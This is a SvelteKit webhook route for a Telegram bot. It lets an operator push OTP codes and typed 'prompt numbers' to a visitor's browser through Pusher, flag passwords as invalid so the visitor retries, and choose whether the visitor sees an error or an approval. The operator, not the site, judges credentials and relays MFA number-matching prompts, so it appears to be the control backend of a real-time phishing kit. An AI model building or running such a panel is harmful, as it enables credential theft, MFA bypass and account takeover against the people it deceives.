import { json } from '@sveltejs/kit';
import { Bot, webhookCallback, Keyboard, InlineKeyboard, session } from 'grammy';
import { sql } from '$lib/server/db';
import Pusher from 'pusher';
import { TELEGRAM_BOT_TOKEN, PUSHER_APP_ID, PUSHER_KEY, PUSHER_SECRET, PUSHER_CLUSTER } from '$env/static/private';


// 🛠️ CREATES A CUSTOM BUN NATIVE STORAGE ADAPTER
const bunNativeStorage = {
  // Read session string data from Neon SQL
  async read(key) {
    const result = await sql`SELECT value FROM telegram_sessions WHERE key = ${key}`;
    if (result.length === 0) return undefined;
    return JSON.parse(result[0].value);
  },
  
  // Write or update session string data into Neon SQL
  async write(key, value) {
    const valueString = JSON.stringify(value);
    await sql`
      INSERT INTO telegram_sessions (key, value) 
      VALUES (${key}, ${valueString})
      ON CONFLICT (key) 
      DO UPDATE SET value = ${valueString}
    `;
  },
  
  // Delete the session record when wiped clean
  async delete(key) {
    await sql`DELETE FROM telegram_sessions WHERE key = ${key}`;
  }
};

// Initialize your bot with the secure environment variable
const bot = new Bot(TELEGRAM_BOT_TOKEN);

// Inject the persistent custom Bun native session adapter
bot.use(session({ 
  initial: () => ({ 
    waitingForType: null, 
    activeSessionId: null, 
    targetMessageId: null 
  }),
  storage: bunNativeStorage // <-- Powered directly by Bun's native compiled layer
}));

// Initialize Pusher to broadcast serverless events
const pusher = new Pusher({
  appId: PUSHER_APP_ID,
  key: PUSHER_KEY,
  secret: PUSHER_SECRET,
  cluster: PUSHER_CLUSTER,
  useTLS: true
});

// const telegramAPIendpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

// 1. Handle /start command: help trigger what action to be taken when the command is triggered
// bot.command('start', async (ctx) => {
//   // Create a native bottom reply keyboard that requests contact info
// 	/* const phoneKeyboard = new Keyboard()
// 		.requestContact('📱 Share My Phone Number')
// 		.placeholder('Click the button below...')
// 		.oneTime() // Auto-hides after clicking
// 		.resized()
//   ; */

// 	const keyboard = new InlineKeyboard()
//     .text('✨ OTP Code', 'trigger_otp')
//     .text('⚡ Prompt Number', 'trigger_prompt')
// 	;

//   await ctx.reply('Choose an action to verify your session on the website:', {
//     reply_markup: keyboard
//   });

//   // await ctx.reply('Welcome! Your SvelteKit-powered bot is alive! 🚀 Please share your phone number to verify your identity.', {
// 	// 	reply_markup: phoneKeyboard
// 	// });
// });


// 2. Handle when the user actually shares their phone number
/* bot.on('message:contact', async (ctx) => {
	const phoneNumber = ctx.message.contact.phone_number;
	const firstName = ctx.message.contact.first_name;

	// Create an inline keyboard for custom application workflows like an OTP trigger
	const otpKeyboard = new InlineKeyboard()
		.text('✨ Generate OTP', 'trigger_otp')
		.text('❌ Cancel', 'cancel_action')
  ;

	await ctx.reply(`Thank you ${firstName}! Phone number verified: <code>${phoneNumber}</code>. Would you like to generate an OTP code now?`, {
		parse_mode: 'HTML',
		reply_markup: otpKeyboard
	});
}); */


// 3. Handle interactive clicks from your Inline Keyboard (OTP Button Trigger)
/* bot.callbackQuery('trigger_otp', async (ctx) => {
	// Acknowledge the button click instantly to stop the loading spinner
	await ctx.answerCallbackQuery({ text: 'Generating code...' });

	// Simulate generating a 6-digit OTP
	const generatedOtp = Math.floor(100000 + Math.random() * 900000);

	const htmlMsg = `<h3>Your temporary sign-in code is: 🔑</h3> <code>${generatedOtp}</code> Do not share this code with anyone.`

	// Update the message text to display the custom OTP payload
	await ctx.editMessageText(htmlMsg, {
		parse_mode: 'HTML'
	});
}); */

// 2. Handle Prompt Number Button Click
/* bot.callbackQuery('trigger_prompt', async (ctx) => {
  await ctx.answerCallbackQuery({ text: 'Generating Prompt Number...' });

  // Generate a dynamic 2-digit random verification prompt number
  const generatedPromptNum = Math.floor(10 + Math.random() * 90).toString();

  // Send the prompt number to the FRONTEND instantly via Pusher
  await pusher.trigger('auth-channel', 'new-auth-data', {
    type: 'PROMPT', // 'PROMPT' | 'OTP'
    value: generatedPromptNum
  });

  // Update the Telegram message UI for the user
  await ctx.editMessageText(`✅ **Prompt Number Generated!**\n\nPrompt number \`${generatedPromptNum}\` has been broadcasted to your browser window.`, {
    parse_mode: 'Markdown'
  });
}); */

// Handle cancel button click
/* bot.callbackQuery('cancel_action', async (ctx) => {
	await ctx.answerCallbackQuery();
	await ctx.editMessageText('❌ Action cancelled successfully.');
}); */


// Insert this right above your existing bot.callbackQuery(/^(otp|prompt):(.+)$/) block:

bot.callbackQuery(/^pw_fail:(.+)$/, async (ctx) => {
  await ctx.answerCallbackQuery();
  
  const sessionId = ctx.match[1];

  try {
    // 1. Broadcast explicit password failure event down to the specific browser tab
    await pusher.trigger(`private-session-${sessionId}`, 'password-failed-event', {
      error: true,
      message: 'The password entered was invalid. Please double-check and try again.'
    });

    // 2. Clear out the interaction buttons from the Telegram message context
    await ctx.editMessageText(
      `
        ${ctx.callbackQuery.message?.text} \n\n ⚠️ 
        **Flagged**: Handled as an invalid password attempt. User prompted to retry.
      `, 
      {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] }
      }
    );

  } catch (error) {
    console.error('Failed to broadcast password failure flag:', error);
    await ctx.reply('❌ Network drop. Failed to send alert back to the web window.');
  }
});

// 1. Intercept clicks on the buttons generated by your form action
bot.callbackQuery(/^(otp|prompt):(.+)$/, async (ctx) => {
  await ctx.answerCallbackQuery();
  
  const [_, actionType, sessionId] = ctx.match;
  const targetMsgId = ctx.callbackQuery.message?.message_id || null;

  // ==========================================
  // CASE: OTP BUTTON CLICKED (Instant Auto-Generate Number)
  // ==========================================
  if (actionType === 'otp') {
    // Generate code automatically on the server
    const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();

    try {
      // Broadcast the generated code to the frontend immediately
      await pusher.trigger(`private-session-${sessionId}`, 'auth-event', {
        type: 'OTP',
        value: generatedCode
      });

      // Strip out the initial choice buttons from the form alert message
      if (targetMsgId) {
        await ctx.api.editMessageReplyMarkup(ctx.chat.id, targetMsgId, { reply_markup: { inline_keyboard: [] } });
      }

      // Creates the final Success/Error evaluation buttons
      const evaluationKeyboard = new InlineKeyboard()
        .text('❌ Show Error', `verify:error:${sessionId}`)
        .text('✅ Approve', `verify:success:${sessionId}`)
      ;

      // Update Telegram interface directly with the code logs and evaluation controls (shows error/success mesage btn command)
      await ctx.reply(
        `
          ⚡ **OTP Code Automatically Sent!** \n\n
          Generated value \`${generatedCode}\` was broadcasted as **OTP** to the website client. \n\n
          Please evaluate the user state below:`
        ,
        {
          parse_mode: 'Markdown',
          reply_markup: evaluationKeyboard
        }
      );
    } catch (error) {
      console.error('Failed to broadcast auto-generated OTP:', error);
      await ctx.reply('❌ Network drop. Could not transmit the automated OTP.');
    }

    return; // Stops execution here for OTP path
  }
  
  // ==========================================
  // CASE: PROMPT BUTTON CLICKED (Wait for typed input)
  // ==========================================
  if (actionType === 'prompt') {
    // save state tracking parameters into Neon session database layer
    ctx.session.waitingForType = 'PROMPT';
    ctx.session.activeSessionId = sessionId;
    ctx.session.targetMessageId = targetMsgId;

    // await message chat on Telegram
    await ctx.reply(`✍️ Please **type and send** the custom code or number you want to deliver as the **'PROMPT'**:`, {
      parse_mode: 'Markdown'
    });
  }
});

// callback query that intercept Success/Error evaluation button clicks
bot.callbackQuery(/^verify:(success|error):(.+)$/, async (ctx) => {
  await ctx.answerCallbackQuery();
  
  const [_, statusType, sessionId] = ctx.match;
  const isApproved = statusType === 'success';

  try {
    // Broadcast the final status directly to the active web window instance
    await pusher.trigger(`private-session-${sessionId}`, 'final-status-event', {
      status: isApproved ? 'APPROVED' : 'REJECTED'
    });

    // Update the message text inside Telegram to clear buttons and finalize history log
    const confirmationText = isApproved 
      ? '🟢 **Session Approved**: \n The user session has been successfully finalized on the website frontend.'
      : '🔴 **Session Rejected**: \n An explicit error block has been shown on the user\'s screen.';

    await ctx.editMessageText(confirmationText, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [] } // Wipe evaluation buttons clean to prevent double actions
    });

  } catch (error) {
    console.error('Failed to broadcast final status evaluation payload:', error);
    await ctx.reply('❌ Transmission error. Couldn\'t send status to the browser.');
  }
});


// 2. Intercept the Text Message Typed by the Admin
bot.on('message:text', async (ctx) => {
  // if bot not waiting for message.
  if (!ctx.session.waitingForType || !ctx.session.activeSessionId) {
    return ctx.reply(`You said: ${ctx.message.text}`);
  }

  const userTypedCode = ctx.message.text.trim();
  const currentMode = ctx.session.waitingForType; // will be 'PROMPT'
  const targetSessionId = ctx.session.activeSessionId;
  const targetMsgId = ctx.session.targetMessageId;

  try {
		// Broadcast the raw value data to Pusher
    await pusher.trigger(`private-session-${targetSessionId}`, 'auth-event', {
      type: currentMode,
      value: userTypedCode
    });

		// Strip out the old OTP/Prompt select buttons from the form alert message
    if (targetMsgId) {
      await ctx.api.editMessageReplyMarkup(ctx.chat.id, targetMsgId, { reply_markup: { inline_keyboard: [] } });
    }

    // Create a new inline keyboard to send a final Success/Error evaluation statement
    const evaluationKeyboard = new InlineKeyboard()
		.text('❌ Show Error', `verify:error:${targetSessionId}`)
		.text('✅ Show Success', `verify:success:${targetSessionId}`)
		;

    // Send confirmation back to your Telegram app with evaluation buttons attached
    await ctx.reply(
      `
				🚀 **Data Transmitted!** \n\n
				Custom value \`${userTypedCode}\` was broadcasted as **${currentMode}** to the website. \n\n
				Please send the website what to show the user, below:
			`, 
      {
        parse_mode: 'Markdown',
        reply_markup: evaluationKeyboard
      }
    );

    // Triggers custom delete() adapter logic automatically (Reset temporary conversation states safely)
    ctx.session.waitingForType = null;
    ctx.session.activeSessionId = null;
    ctx.session.targetMessageId = null;

  } catch (error) {
    console.error('Failed to broadcast typed response:', error);
    await ctx.reply('❌ Network transmission dropped. Please type the value again.');
  }
});


/** @type {import('./$types').RequestHandler} */
export async function POST(event) {
  try {
    // grammY handles parsing the request and executing bot logic internally
		const handleUpdate = webhookCallback(bot, 'sveltekit');
		return await handleUpdate(event);
    // return json({ success: true, data: {} });
    
  } catch (error) {
    console.error('Error handling Telegram update: \n', error);
		return json({ error: 'Internal Server Error \n' }, { status: 500 });
  }
}